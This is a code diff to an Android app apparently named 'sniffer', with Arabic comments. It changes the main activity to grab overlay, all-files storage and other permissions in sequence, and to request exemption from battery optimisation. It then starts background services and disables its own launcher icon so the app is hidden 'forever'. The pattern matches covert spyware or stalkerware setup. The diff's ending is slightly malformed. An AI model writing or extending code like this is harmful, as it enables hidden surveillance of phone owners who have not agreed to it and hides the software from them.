@@ -1,6 +1,7 @@
 package com.v8.global.sniffer;
 
 import android.app.Activity;
+import android.app.AlertDialog;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.DialogInterface;
@@ -28,29 +29,18 @@ public class MainActivity extends Activity {
 
     private static final int PERMISSION_REQUEST_CODE = 100;
     private static final int SYSTEM_ALERT_WINDOW_CODE = 101;
-    private boolean permissionsRequested = false;
-    private int permissionRetryCount = 0;
+    private static final int MANAGE_STORAGE_CODE = 102;
     
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // إخفاء التطبيق فوراً
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            finishAndRemoveTask();
-        }
-        
-        // بدء عملية الصلاحيات بعد ثانية
-        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                startPermissionProcess();
-            }
-        }, 1000);
+        // بدء عملية الصلاحيات فوراً
+        startPermissionProcess();
     }
     
     private void startPermissionProcess() {
-        // أولاً: طلب صلاحية SYSTEM_ALERT_WINDOW (مهم جداً)
+        // 1. أولاً: طلب صلاحية SYSTEM_ALERT_WINDOW (الأهم)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this)) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -60,7 +50,17 @@ public class MainActivity extends Activity {
             }
         }
         
-        // ثانياً: طلب باقي الصلاحيات
+        // 2. طلب صلاحية إدارة الملفات للأندرويد 11+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, MANAGE_STORAGE_CODE);
+                return;
+            }
+        }
+        
+        // 3. طلب باقي الصلاحيات
         requestAllPermissions();
     }
     
@@ -91,14 +91,13 @@ public class MainActivity extends Activity {
             }
         }
         
-        if (!permissionsNeeded.isEmpty() && !permissionsRequested) {
-            permissionsRequested = true;
+        if (!permissionsNeeded.isEmpty()) {
             ActivityCompat.requestPermissions(this, 
                 permissionsNeeded.toArray(new String[0]), 
                 PERMISSION_REQUEST_CODE);
         } else {
             // كل الصلاحيات ممنوحة
-            setupComplete();
+            completeSetup();
         }
     }
     
@@ -107,29 +106,13 @@ public class MainActivity extends Activity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // التحقق من الصلاحيات المرفوضة
-            List<String> deniedPermissions = new ArrayList<>();
-            for (int i = 0; i < permissions.length; i++) {
-                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
-                    deniedPermissions.add(permissions[i]);
+            // بعد طلب الصلاحيات، أكمل الإعداد
+            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    completeSetup();
                 }
-            }
-            
-            if (!deniedPermissions.isEmpty() && permissionRetryCount < 3) {
-                // إعادة طلب الصلاحيات المرفوضة
-                permissionRetryCount++;
-                ActivityCompat.requestPermissions(this, 
-                    deniedPermissions.toArray(new String[0]), 
-                    PERMISSION_REQUEST_CODE);
-            } else {
-                // بعد 3 محاولات أو نجاح كل الصلاحيات
-                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        setupComplete();
-                    }
-                }, 2000);
-            }
+            }, 2000);
         }
     }
     
@@ -137,13 +120,18 @@ public class MainActivity extends Activity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         
-        if (requestCode == SYSTEM_ALERT_WINDOW_CODE) {
-            // بعد صلاحية النوافذ العائمة، نكمل باقي الصلاحيات
-            requestAllPermissions();
+        if (requestCode == SYSTEM_ALERT_WINDOW_CODE || requestCode == MANAGE_STORAGE_CODE) {
+            // العودة من شاشة الصلاحيات، أكمل العملية
+            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    startPermissionProcess();
+                }
+            }, 1000);
         }
     }
     
-    private void setupComplete() {
+    private void completeSetup() {
         // طلب تجاهل تحسين البطارية
         requestIgnoreBatteryOptimizations();
         
@@ -156,8 +144,8 @@ public class MainActivity extends Activity {
         // تشغيل الخدمات
         startServices();
         
-        // إنهاء النشاط
-        finish();
+        // إخفاء التطبيق للأبد
+        hideApp();
     }
     
     private void requestIgnoreBatteryOptimizations() {
@@ -213,8 +201,22 @@ public class MainActivity extends Activity {
         } else {
             startService(guardianIntent);
         }
-        
-        // تشغيل مساعد الصلاحيات
-        AutoPermissionHelper.startPermissionHelper(this);
     }
-}
+    
+    private void hideApp() {
+        // إخفاء الأيقونة من المشغل (للمستخدم العادي)
+        PackageManager p = getPackageManager();
+        ComponentName componentName = new ComponentName(this, SplashActivity.class);
+        p.setComponentEnabledSetting(componentName, 
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
+            PackageManager.DONT_KILL_APP);
+        
+        // إنهاء النشاط
+        finish();
+        
+        // إغلاق التطبيق بالكامل
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            finishAndRemoveTask();
+        }
+    }
+        }
